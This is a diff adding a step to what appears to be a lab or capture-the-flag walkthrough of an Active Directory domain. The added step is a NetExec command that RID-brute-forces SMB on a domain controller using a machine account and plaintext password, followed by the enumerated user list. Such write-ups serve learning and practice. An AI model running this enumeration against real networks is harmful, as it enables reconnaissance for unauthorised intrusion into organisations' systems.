@@ -272,6 +272,21 @@ Just the default SMB shares!
 
 ## Dumping users 
 ```python
-
+nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --rid-brute 20000 --smb-timeout 5 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+FRG0310$
+PROD$
+o.rodrigo
+j.woods
+d.goggins
+c.white
+sharedadmin
 ```
+
+Ill dump them all to a user file!
+
+
 
